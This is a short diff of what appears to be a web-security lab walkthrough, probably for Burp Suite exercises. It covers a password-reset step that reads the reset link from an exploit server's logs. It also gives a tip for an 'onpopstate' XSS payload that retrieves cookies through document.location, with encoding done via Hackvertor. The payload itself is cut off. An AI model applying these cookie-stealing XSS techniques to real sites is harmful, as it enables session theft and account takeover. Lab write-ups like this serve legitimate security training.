@@ -87,7 +87,8 @@ For the next step we have to open the exploit server and copy the exploit server
 Our last step is to open the http logs from exploit server and take the reset link with new password functionality
 
 # [0x8] onpopstate XSS cookie retrieve 
-You have to encode the payload with hackvertor extension
+You have to encode the payload with hackvertor extension.
+Ps. Don't forget the ``` ` ``` quote after onpopstate=document.location=<HERE QUOTES> 
 ```
 <@burp_urlencode>
 
